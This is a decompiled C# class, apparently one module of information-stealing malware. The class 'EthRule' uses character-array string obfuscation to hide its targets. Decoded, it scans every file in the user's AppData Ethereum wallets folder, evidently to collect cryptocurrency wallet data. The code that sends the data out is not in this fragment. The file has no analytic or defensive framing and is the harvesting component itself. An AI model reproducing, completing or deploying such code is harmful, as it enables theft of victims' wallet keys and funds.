using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x0200001C RID: 28
public class EthRule : FileScannerRule
{
	// Token: 0x06000074 RID: 116 RVA: 0x00005D2C File Offset: 0x00003F2C
	public EthRule()
	{
		base.Name = new string(new char[]
		{
			'E',
			'S',
			'y',
			's',
			't',
			'e',
			'm',
			'.',
			'U',
			'I',
			't',
			'h',
			'e',
			'r',
			'S',
			'y',
			's',
			't',
			'e',
			'm',
			'.',
			'U',
			'I',
			'e',
			'u',
			'm'
		}).Replace("System.UI", string.Empty);
	}

	// Token: 0x06000075 RID: 117 RVA: 0x00004F07 File Offset: 0x00003107
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		return filePath.Directory.FullName.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\", string.Empty);
	}

	// Token: 0x06000076 RID: 118 RVA: 0x00005D60 File Offset: 0x00003F60
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + new string(new char[]
			{
				'\\',
				'E',
				't',
				'F',
				'i',
				'l',
				'e',
				'.',
				'I',
				'O',
				'h',
				'e',
				'r',
				'e',
				'u',
				'F',
				'i',
				'l',
				'e',
				'.',
				'I',
				'O',
				'm',
				'\\',
				'w',
				'a',
				'l',
				'F',
				'i',
				'l',
				'e',
				'.',
				'I',
				'O',
				'l',
				'e',
				't',
				's'
			}).Replace("File.IO", string.Empty);
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
